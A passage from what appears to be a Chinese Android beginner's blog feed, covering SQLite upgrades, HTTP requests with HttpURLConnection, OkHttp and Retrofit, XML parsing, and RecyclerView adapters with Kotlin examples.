<li>一个应用程序的版本迭代会有多种可能，第一版到第二版甚至到第n版。如果因为没设置好升级功能。直接跳过版本迭代。导致的数据丢失。会使用户失去体验感。<br>因此采取了以下措施：<br>再<code>onUpgrade()</code>方法中，根据版本号进行迭代，如下：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">override fun <span class="title function_">onUpgrade</span><span class="params">(db: SQLiteDatabase, oldVersion: Int, newVersion: Int)</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (oldVersion &lt;= <span class="number">1</span>) &#123;</span><br><span class="line"> db.execSQL(createCategory)</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (oldVersion &lt;= <span class="number">2</span>) &#123;</span><br><span class="line"> db.execSQL(<span class="string">&quot;alter table Book add column category_id integer&quot;</span>)</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
 这样子的好处就是，你从不同的版本迭代，都尽量帮你升级到最新版且保持数据不丢失</li>
</ol>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(网络)</title>
    <url>/posts/86a9b01e/</url>
    <content><![CDATA[<h2 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h2><p>可以在应用中嵌入一个浏览器，从而展示各种网页</p>
<h2 id="使用HTTP请求访问网络"><a href="#使用HTTP请求访问网络" class="headerlink" title="使用HTTP请求访问网络"></a>使用HTTP请求访问网络</h2><h3 id="HttpURLConnection"><a href="#HttpURLConnection" class="headerlink" title="HttpURLConnection"></a>HttpURLConnection</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//他的流程是：</span></span><br><span class="line"><span class="comment">//先设置一个Url地址，然后通过url打开一个连接并强转为HttpURLConnection并保存为一个connection对象</span></span><br><span class="line"><span class="comment">//为这个对象设置请求方法，超时时间如.然后获取他的输入流，然后读取即可。</span></span><br><span class="line">thread &#123;</span><br><span class="line"><span class="type">val</span> <span class="variable">string</span> <span class="operator">=</span> StringBuilder()</span><br><span class="line"><span class="type">val</span> <span class="variable">url</span> <span class="operator">=</span> URL(<span class="string">&quot;https://zfxt.top/sentence&quot;</span>)</span><br><span class="line"><span class="type">val</span> <span class="variable">connection</span> <span class="operator">=</span> url.openConnection() as HttpURLConnection</span><br><span class="line">connection.requestMethod = <span class="string">&quot;GET&quot;</span></span><br><span class="line">connection.connectTimeout=<span class="number">8000</span></span><br><span class="line">connection.readTimeout=<span class="number">8000</span></span><br><span class="line"><span class="type">val</span> <span class="variable">input</span> <span class="operator">=</span> connection.inputStream</span><br><span class="line"><span class="type">val</span> <span class="variable">reader</span> <span class="operator">=</span> input.bufferedReader()</span><br><span class="line"><span class="comment">//使用use他会读取完成后自动关闭流</span></span><br><span class="line">reader.use &#123;</span><br><span class="line">string.append(it.readText())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//因为这是在一个子线程上，是不允许修改ui的，所以要在主线程上执行。</span></span><br><span class="line">runOnUiThread &#123;</span><br><span class="line">binding.responseText.text = string</span><br><span class="line">&#125;</span><br><span class="line">connection.disconnect()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时他也需要声明网络权限：<br><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;</code><br>如果要像服务器发送post请求，那么就打开output流，然后输入数据，记得每个数据必须是键值对的形式，不同的数据需要用&amp;隔开。</p>
<h3 id="OKhttp"><a href="#OKhttp" class="headerlink" title="OKhttp"></a>OKhttp</h3><ol>
<li><p>先声明一个客户端<code>val client = OKHttpClient()</code></p>
</li>
<li><p>然后声明一条请求request</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Get请求</span></span><br><span class="line"><span class="type">val</span> <span class="variable">request</span> <span class="operator">=</span> Request().Builder()</span><br><span class="line">		.url()</span><br><span class="line">		.<span class="comment">//可以连缀很多方法修饰其内容</span></span><br><span class="line">		.build()</span><br><span class="line"><span class="comment">//Post请求稍微麻烦一点，需要构建一个对象</span></span><br><span class="line"><span class="type">val</span> <span class="variable">requestBody</span> <span class="operator">=</span> FormBody.Build()...build()</span><br><span class="line">request=Request().Buildder().</span><br><span class="line">...</span><br><span class="line">.post(requestBody).build()</span><br></pre></td></tr></table></figure>
<p>而且request是分离的，低耦合。</p>
</li>
<li><p>获取响应<code>val response = client.newCall(request).execute()</code></p>
</li>
<li><p>获取返回对象&#96;val data &#x3D; response.body?.string()</p>
</li>
</ol>
<h2 id="解析XML和JSON格式数据"><a href="#解析XML和JSON格式数据" class="headerlink" title="解析XML和JSON格式数据"></a>解析XML和JSON格式数据</h2><h3 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h3><h4 id="pull解析"><a href="#pull解析" class="headerlink" title="pull解析"></a>pull解析</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> fun <span class="title function_">parseXMLWithPull</span><span class="params">(xmlData: String)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">factory</span> <span class="operator">=</span> XmlPullParserFactory.newInstance()</span><br><span class="line">            <span class="type">val</span> <span class="variable">xmlPullParse</span> <span class="operator">=</span> factory.newPullParser()</span><br><span class="line">            xmlPullParse.setInput(StringReader(xmlData))</span><br><span class="line">            <span class="type">var</span> <span class="variable">eventType</span> <span class="operator">=</span> xmlPullParse.eventType</span><br><span class="line">            <span class="type">var</span> <span class="variable">id</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="type">var</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="type">var</span> <span class="variable">version</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> (eventType != XmlPullParser.END_DOCUMENT) &#123;</span><br><span class="line">                <span class="type">val</span> <span class="variable">nodeName</span> <span class="operator">=</span> xmlPullParse.name</span><br><span class="line">                <span class="title function_">when</span> <span class="params">(eventType)</span> &#123;</span><br><span class="line">                    <span class="comment">//开始解析某个节点</span></span><br><span class="line">                    XmlPullParser.START_TAG -&gt; &#123;</span><br><span class="line">                        <span class="keyword">when</span> (nodeName) &#123;</span><br><span class="line">                            <span class="string">&quot;id&quot;</span> -&gt; id = xmlPullParse.nextText()</span><br><span class="line">                            <span class="string">&quot;name&quot;</span> -&gt; name = xmlPullParse.nextText()</span><br><span class="line">                            <span class="string">&quot;version&quot;</span> -&gt; version = xmlPullParse.nextText()</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//完整解析某个节点</span></span><br><span class="line">                    XmlPullParser.END_TAG -&gt; &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">&quot;app&quot;</span> == nodeName) &#123;</span><br><span class="line">                            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;id is $id&quot;</span>)</span><br><span class="line">                            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;name is $name&quot;</span>)</span><br><span class="line">                            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;version is $version&quot;</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                eventType = xmlPullParse.next()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">            e.printStackTrace()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="sax解析"><a href="#sax解析" class="headerlink" title="sax解析"></a>sax解析</h4><p>不细讲，用的时候再学</p>
<h3 id="json解析"><a href="#json解析" class="headerlink" title="json解析"></a>json解析</h3><p>不细讲，自己理解<br>还有GSON的使用。这些都是不难的东西，不需要特别理解。只要看一眼就会明白</p>
<h2 id="网络请求回调的实现方法"><a href="#网络请求回调的实现方法" class="headerlink" title="网络请求回调的实现方法"></a>网络请求回调的实现方法</h2><p>如果每次每次发送请求都写一遍发送HTTP请求的代码，就显得代码非常的难看。<br>所以通常将这些通用的网络操作提取到一个公共的类里，并提供一个公用方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">object HttpUtil &#123;</span><br><span class="line">    fun <span class="title function_">sendHttpRequest</span><span class="params">(address: String)</span>: String &#123;</span><br><span class="line">        <span class="keyword">var</span> connection: HttpURLConnection? = <span class="literal">null</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">response</span> <span class="operator">=</span> StringBuilder()</span><br><span class="line">            <span class="type">val</span> <span class="variable">url</span> <span class="operator">=</span> URL(address)</span><br><span class="line">            connection = url.openConnection() as HttpURLConnection</span><br><span class="line">            connection.connectTimeout = <span class="number">8000</span></span><br><span class="line">            connection.readTimeout = <span class="number">8000</span></span><br><span class="line">            <span class="type">val</span> <span class="variable">input</span> <span class="operator">=</span> connection.inputStream</span><br><span class="line">            <span class="type">val</span> <span class="variable">reader</span> <span class="operator">=</span> BufferedReader(InputStreamReader(input))</span><br><span class="line">            reader.use &#123;</span><br><span class="line">                reader.forEachLine &#123;</span><br><span class="line">                    response.append(it)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> response.toString()</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">            e.printStackTrace()</span><br><span class="line">            <span class="keyword">return</span> e.message.toString()</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            connection?.disconnect()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上述代码所述，将一个网络请求封装起来。然后每次调用这个方法即可获得返回的数据<br><strong>但是，一个子线程是无法通过return返回数据回到主线程的。主线程并不会阻塞的等待他返回。所以往往会采用回调的方式去解决这个问题</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一个回调接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">HttpCallbackListener</span> &#123;</span><br><span class="line">	fun <span class="title function_">onFinish</span><span class="params">(response: String)</span></span><br><span class="line"> 	fun <span class="title function_">onError</span><span class="params">(e: Exception)</span></span><br><span class="line">&#125;</span><br><span class="line">object HttpUtil &#123;</span><br><span class="line">    fun <span class="title function_">sendHttpRequest</span><span class="params">(address: String, listener: HttpCallbackListener)</span> &#123;</span><br><span class="line">        thread &#123;</span><br><span class="line">            <span class="keyword">var</span> connection: HttpURLConnection? = <span class="literal">null</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">val</span> <span class="variable">response</span> <span class="operator">=</span> StringBuilder()</span><br><span class="line">                <span class="type">val</span> <span class="variable">url</span> <span class="operator">=</span> URL(address)</span><br><span class="line">                connection = url.openConnection() as HttpURLConnection</span><br><span class="line">                connection.connectTimeout = <span class="number">8000</span></span><br><span class="line">                connection.readTimeout = <span class="number">8000</span></span><br><span class="line">                <span class="type">val</span> <span class="variable">input</span> <span class="operator">=</span> connection.inputStream</span><br><span class="line">                <span class="type">val</span> <span class="variable">reader</span> <span class="operator">=</span> BufferedReader(InputStreamReader(input))</span><br><span class="line">                reader.use &#123;</span><br><span class="line">                    reader.forEachLine &#123;</span><br><span class="line">                        response.append(it)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 回调onFinish()方法</span></span><br><span class="line">                listener.onFinish(response.toString())</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">                e.printStackTrace()</span><br><span class="line">                <span class="comment">// 回调onError()方法</span></span><br><span class="line">                listener.onError(e)</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                connection?.disconnect()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新写的方法他就可以使用回调。他相比于原来的方法，他多了一个参数，也就是传入一个<code>HttpCallbackListener</code>的实例类，然后通过这个实例中重写的方法去实现回调。<br>当你在主线程中要使用到这个网络请求并回调时可以像下面这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HttpUtil.sendHttpRequest(address, object : HttpCallbackListener &#123;</span><br><span class="line"> 	override fun <span class="title function_">onFinish</span><span class="params">(response: String)</span> &#123;</span><br><span class="line"> <span class="comment">// 得到服务器返回的具体内容</span></span><br><span class="line"> 	&#125;</span><br><span class="line"> 	override fun <span class="title function_">onError</span><span class="params">(e: Exception)</span> &#123;</span><br><span class="line"> <span class="comment">// 在这里对异常情况进行处理</span></span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>你调用了网络请求，然后重写了这个方法，在子线程中，onFinish方法会阻塞直到返回数据，然后你在这边定义的方法中获取返回的数据。</p>
<h2 id="OKhttp-1"><a href="#OKhttp-1" class="headerlink" title="OKhttp"></a>OKhttp</h2><p>如果使用OKhttp的话，他的回调会更加简单，因为他内置了自行的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">sendOkHttpRequest</span><span class="params">(address: String, callback: okhttp3.Callback)</span> &#123;</span><br><span class="line">	 <span class="type">val</span> <span class="variable">client</span> <span class="operator">=</span> OkHttpClient()</span><br><span class="line">	 <span class="type">val</span> <span class="variable">request</span> <span class="operator">=</span> Request.Builder()</span><br><span class="line"> 		.url(address)</span><br><span class="line">		 .build()</span><br><span class="line"> 	client.newCall(request).enqueue(callback)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>他这里没有使用execute，而是使用enqueue，他会帮我们在子线程中执行这个网络请求，并且请求完成后，返回到这个callback中。<br>如果要使用的话，也是一样要重写方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HttpUtil.sendOkHttpRequest(address, object : Callback &#123;</span><br><span class="line"> override fun <span class="title function_">onResponse</span><span class="params">(call: Call, response: Response)</span> &#123;</span><br><span class="line"> <span class="comment">// 得到服务器返回的具体内容</span></span><br><span class="line"> <span class="type">val</span> <span class="variable">responseData</span> <span class="operator">=</span> response.body?.string()</span><br><span class="line"> &#125;</span><br><span class="line"> override fun <span class="title function_">onFailure</span><span class="params">(call: Call, e: IOException)</span> &#123;</span><br><span class="line"> <span class="comment">// 在这里对异常情况进行处理</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这样子也很简单</p>
<h2 id="Retrofit网络框架"><a href="#Retrofit网络框架" class="headerlink" title="Retrofit网络框架"></a>Retrofit网络框架</h2><p>他同样也是Square开发的网络库，与OKhttp相比，他的定位是应用层的网络通信库，而OKhttp是底层通信的实现。<br>他有哪些优点：</p>
<ol>
<li>可以配置一个根路径，然后具体的请求接口只需要使用相对路径即可</li>
<li>他可以对服务器接口进行归类，把同一类的服务器接口定义到同一个接口文件中。</li>
<li>相比于GSON中对于list数据，需要声明type，这里的强大泛型类，可以直接使用<br>Retrofit导入如下的包<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">implementation <span class="string">&#x27;com.squareup.retrofit2:retrofit:2.6.1&#x27;</span></span><br><span class="line">implementation <span class="string">&#x27;com.squareup.retrofit2:converter-gson:2.6.1&#x27;</span></span><br></pre></td></tr></table></figure>
他是基于OKhttp开发的，所以他会把retrofit，okhttp，okio都下载下来，而第二个包则会辅助把gson一起下载下来，他会自动解析gson。<br>给一个样例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>(val id: String, val name: String, val version: String)</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">AppService</span>&#123;</span><br><span class="line">    <span class="meta">@GET(&quot;get_data.json&quot;)</span></span><br><span class="line">    fun <span class="title function_">getAppData</span><span class="params">()</span>:Call&lt;List&lt;App&gt;&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">val</span> <span class="variable">retrofit</span> <span class="operator">=</span> Retrofit.Builder()</span><br><span class="line">        .baseUrl(<span class="string">&quot;https://zfxt.top/&quot;</span>)</span><br><span class="line">        .addConverterFactory(GsonConverterFactory.create())</span><br><span class="line">        .build()</span><br><span class="line">    <span class="type">val</span> <span class="variable">appService</span> <span class="operator">=</span> retrofit.create(AppService::class.java)</span><br><span class="line">    appService.getAppData().enqueue(object : Callback&lt;List&lt;App&gt;&gt;&#123;</span><br><span class="line">        override fun <span class="title function_">onResponse</span><span class="params">(call: Call&lt;List&lt;App&gt;&gt;, response: Response&lt;List&lt;App&gt;&gt;)</span> &#123;</span><br><span class="line">           <span class="type">val</span> <span class="variable">list</span> <span class="operator">=</span> response.body()</span><br><span class="line">            <span class="keyword">if</span>(list!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(app in list)&#123;</span><br><span class="line">                    println(app.id)</span><br><span class="line">                    println(app.name)</span><br><span class="line">                    println(app.version)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        override fun <span class="title function_">onFailure</span><span class="params">(call: Call&lt;List&lt;App&gt;&gt;, t: Throwable)</span> &#123;</span><br><span class="line">            t.printStackTrace()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"> 	&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>他会自动切换线程去完成操作，不用你去考虑切换线程和回调的关系。<br>这里他访问的接口是<code>https://zfxt.top/get_data.json</code>。但是如果我们访问的路径中有动态变化的参数的话，我们需要传递参数进去，如:<br>路径占位符，也可能是符合restfulAPI的写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">ExampleService</span> &#123;</span><br><span class="line"> <span class="meta">@GET(&quot;&#123;page&#125;/get_data.json&quot;)</span></span><br><span class="line"> fun <span class="title function_">getData</span><span class="params">(<span class="meta">@Path(&quot;page&quot;)</span> page: Int)</span>: Call&lt;Data&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果要传递参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//GET http://example.com/get_data.json?u=&lt;user&gt;&amp;t=&lt;token&gt;</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ExampleService</span> &#123;</span><br><span class="line"> <span class="meta">@GET(&quot;get_data.json&quot;)</span></span><br><span class="line"> fun <span class="title function_">getData</span><span class="params">(<span class="meta">@Query(&quot;u&quot;)</span> user: String, <span class="meta">@Query(&quot;t&quot;)</span> token: String)</span>: Call&lt;Data&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有时候我们对于返回的数据并不是特别关心其具体内容，可能只是一个普通的字符串，所以用不着去解析他，可以用Call<ResponseBody>来返回数据。他可以接收任意类型的参数。<br>如果我们要发送post请求并带上body。那么带上@Body注解很有用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">ExampleService</span> &#123;</span><br><span class="line"> <span class="meta">@POST(&quot;data/create&quot;)</span></span><br><span class="line"> fun <span class="title function_">createData</span><span class="params">(<span class="meta">@Body</span> data: Data)</span>: Call&lt;ResponseBody&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>body注解中的内容会被转化为json格式的文本发送出去<br>我们还可以在方法上添加@Headers：如<code>@Headers(&quot;User-Agent: okhttp&quot;, &quot;Cache-Control: max-age=0&quot;)</code>他里面都是键值对，但是如果我们要使用动态的header的话：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">ExampleService</span> &#123;</span><br><span class="line"> <span class="meta">@GET(&quot;get_data.json&quot;)</span></span><br><span class="line"> fun <span class="title function_">getData</span><span class="params">(<span class="meta">@Header(&quot;User-Agent&quot;)</span> userAgent: String,</span></span><br><span class="line"><span class="params"> <span class="meta">@Header(&quot;Cache-Control&quot;)</span> cacheControl: String)</span>: Call&lt;Data&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们还需要传递一个参数进去，为字符串格式</p>
<h3 id="retrofit的最佳写法"><a href="#retrofit的最佳写法" class="headerlink" title="retrofit的最佳写法"></a>retrofit的最佳写法</h3><p>把retrofit封装为一个单例类<br>在其中定义一个方法，接收各种泛型，然后创建：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">object ServiceCreator &#123;</span><br><span class="line">	 <span class="keyword">private</span> const <span class="type">val</span> <span class="variable">BASE_URL</span> <span class="operator">=</span> <span class="string">&quot;http://10.0.2.2/&quot;</span></span><br><span class="line">	 <span class="keyword">private</span> <span class="type">val</span> <span class="variable">retrofit</span> <span class="operator">=</span> Retrofit.Builder()</span><br><span class="line">	 .baseUrl(BASE_URL)</span><br><span class="line">	 .addConverterFactory(GsonConverterFactory.create())</span><br><span class="line">	 .build()</span><br><span class="line"></span><br><span class="line">	 fun &lt;T&gt; create(serviceClass: Class&lt;T&gt;): T = retrofit.create(serviceClass)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为泛型在编译后会被擦除，所以我们这里只有传递参数进去才可以实现创建。但如果使用实化，也就是使用<code>inline fun &lt;reified T&gt; create(): T = create(T::class.java)</code>代替上述代码中的create放啊发。他就可以通过泛型直接创建。</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门（RecyclerView控件）</title>
    <url>/posts/f5884738/</url>
    <content><![CDATA[<h2 id="RecyclerView控件"><a href="#RecyclerView控件" class="headerlink" title="RecyclerView控件"></a>RecyclerView控件</h2><p>首先，他并不是系统自带的控件，而是在<code>androidx</code>中的，也就是还需要从外部导入。不过好在IDEA已经帮我们导入过了，在<code>build.gralde</code>中</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line"></span><br><span class="line">    implementation <span class="string">&#x27;androidx.core:core-ktx:1.7.0&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;androidx.appcompat:appcompat:1.4.1&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;com.google.android.material:material:1.5.0&#x27;</span></span><br><span class="line">    implementation <span class="string">&#x27;androidx.constraintlayout:constraintlayout:2.1.3&#x27;</span></span><br><span class="line">    testImplementation <span class="string">&#x27;junit:junit:4.13.2&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.ext:junit:1.1.3&#x27;</span></span><br><span class="line">    androidTestImplementation <span class="string">&#x27;androidx.test.espresso:espresso-core:3.4.0&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>导入之后就可以正常使用了</p>
<h3 id="普通使用"><a href="#普通使用" class="headerlink" title="普通使用"></a>普通使用</h3><ol>
<li>首先直接在layout布局中声明一个recyclerView控件<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">androidx.recyclerview.widget.RecyclerView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/recyclerView&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>然后继承他的适配器，直接放实例代码<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Girl</span>(val girlName: String, val girlImg: Int)&#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GirlAdapter</span>(val girlList: List&lt;Girl&gt;) :</span><br><span class="line">    RecyclerView.Adapter&lt;GirlAdapter.ViewHolder&gt;() &#123;</span><br><span class="line">	inner <span class="keyword">class</span> <span class="title class_">ViewHolder</span>(view: View) : RecyclerView.ViewHolder(view) &#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">girlName</span> <span class="operator">=</span> view.findViewById&lt;TextView&gt;(R.id.girlName)</span><br><span class="line">        <span class="type">val</span> <span class="variable">girlImg</span> <span class="operator">=</span> view.findViewById&lt;ImageView&gt;(R.id.girlImg)</span><br><span class="line">    &#125;</span><br><span class="line">    override fun <span class="title function_">onCreateViewHolder</span><span class="params">(parent: ViewGroup, viewType: Int)</span>: ViewHolder &#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">view</span> <span class="operator">=</span> LayoutInflater.from(parent.context)</span><br><span class="line">            .inflate(R.layout.girl_item, parent, <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span> ViewHolder(view)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">getItemCount</span><span class="params">()</span> = girlList.size</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onBindViewHolder</span><span class="params">(holder: ViewHolder, position: Int)</span> &#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">girl</span> <span class="operator">=</span> girlList[position]</span><br><span class="line">        holder.girlImg.setImageResource(girl.girlImg)</span><br><span class="line">        holder.girlName.text = girl.girlName</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
相较于listview：<ol>
<li>他只需要接受一个data的参数，更容易理解其中的内容</li>
<li>他需要实现三个方法和一个内部类</li>
</ol>
</li>
</ol>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">释义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ViewHolder</td>
<td align="left">用来简化操作，提前维护好view变量，提高效率</td>
</tr>
<tr>
<td align="left">onCreateViewHolder()</td>
<td align="left">创建ViewHolder对象</td>
</tr>
<tr>
<td align="left">getItemCount()</td>
<td align="left">获取队列的总数</td>
</tr>
<tr>
<td align="left">onBindViewHolder()</td>
<td align="left">实现数据的绑定</td>
</tr>
</tbody></table>
<pre><code>3. 然后再需要使用他的地方，直接引用，直接给实例代码：
</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">setContentView(R.layout.activity_main)</span><br><span class="line">initFruits() <span class="comment">// 初始化水果数据</span></span><br><span class="line"><span class="type">val</span> <span class="variable">layoutManager</span> <span class="operator">=</span> LinearLayoutManager(<span class="built_in">this</span>)</span><br><span class="line">recyclerView.layoutManager = layoutManager</span><br><span class="line"><span class="type">val</span> <span class="variable">adapter</span> <span class="operator">=</span> FruitAdapter(fruitList)</span><br><span class="line">recyclerView.adapter = adapter</span><br></pre></td></tr></table></figure>
<blockquote>
<p>创建了一个LinearLayoutManager对象，并将它设置到RecyclerView当中。LayoutManager用于指定RecyclerView的布局方式，这里使用的<br>LinearLayoutManager是线性布局的意思，可以实现和ListView类似的效果</p>
</blockquote>
<h3 id="布局管理"><a href="#布局管理" class="headerlink" title="布局管理"></a>布局管理</h3><blockquote>
<p>主要得益于RecyclerView出色的设计。ListView的布局排列是由自身去管理的，而RecyclerView则将这个工作交给了LayoutManager。LayoutManager制定了一套可扩展的布局排列接口，子类只要按照接口的规范来实现，就能定制出各种不同排列方式的布局了。</p>
</blockquote>
<p>除了LinearLayoutManager之外，RecyclerView还给我们提供了GridLayoutManager和<br>StaggeredGridLayoutManager这两种内置的布局排列方式。GridLayoutManager可以用实现网格布局，StaggeredGridLayoutManager可以用于实现瀑布流布局<br>线性布局都可以参照下面的实例<br>给一个实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">layoutManager</span> <span class="operator">=</span> StaggeredGridLayoutManager(<span class="number">3</span>,</span><br><span class="line"> StaggeredGridLayoutManager.VERTICAL)</span><br><span class="line"> recyclerView.layoutManager = layoutManager</span><br><span class="line"> <span class="type">val</span> <span class="variable">adapter</span> <span class="operator">=</span> FruitAdapter(fruitList)</span><br><span class="line"> recyclerView.adapter = adapter</span><br></pre></td></tr></table></figure>

<h2 id="点击事件"><a href="#点击事件" class="headerlink" title="点击事件"></a>点击事件</h2><p>首先，RecyclerView并没有像Listview一样定义了点击事件。他并没有专门的点击事件。他的点击事件需要根据具体的每个子项控件去设置。而这样往往更加方便使用和易于理解。<br>下面是一个示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">override fun <span class="title function_">onCreateViewHolder</span><span class="params">(parent: ViewGroup, viewType: Int)</span>: ViewHolder &#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">view</span> <span class="operator">=</span> LayoutInflater.from(parent.context)</span><br><span class="line">            .inflate(R.layout.girl_item, parent, <span class="literal">false</span>)</span><br><span class="line">        <span class="type">val</span> <span class="variable">viewHolder</span> <span class="operator">=</span>  ViewHolder(view)</span><br><span class="line">		<span class="comment">//itemView表示最外层布局，也就是整个子项</span></span><br><span class="line">        viewHolder.itemView.setOnClickListener &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">position</span> <span class="operator">=</span> viewHolder.adapterPosition</span><br><span class="line">			<span class="comment">//获取当前点击处的序列号。</span></span><br><span class="line">            <span class="type">val</span> <span class="variable">girl</span> <span class="operator">=</span> girlList[position]</span><br><span class="line">			<span class="comment">//根据序列获得girl实例</span></span><br><span class="line">            Toast.makeText(parent.context,<span class="string">&quot;you clicked view 